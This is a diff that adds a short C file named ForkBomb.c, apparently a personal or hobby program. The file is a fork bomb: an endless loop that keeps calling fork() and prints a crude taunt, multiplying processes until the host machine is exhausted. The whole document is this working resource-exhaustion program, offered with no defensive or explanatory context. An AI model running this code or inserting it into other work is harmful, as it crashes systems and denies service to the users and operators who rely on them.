@@ -1,0 +1,15 @@
+/*
+ * ForkBomb.c
+ *
+ *  Created on: Jun 16, 2016
+ *      Author: Barrett
+ */
+#include <stdio.h>
+
+int main(){
+	while(1){
+		fork();
+		printf("YOU JUST GOT FORKED MOFO\n");
+	}
+}
+
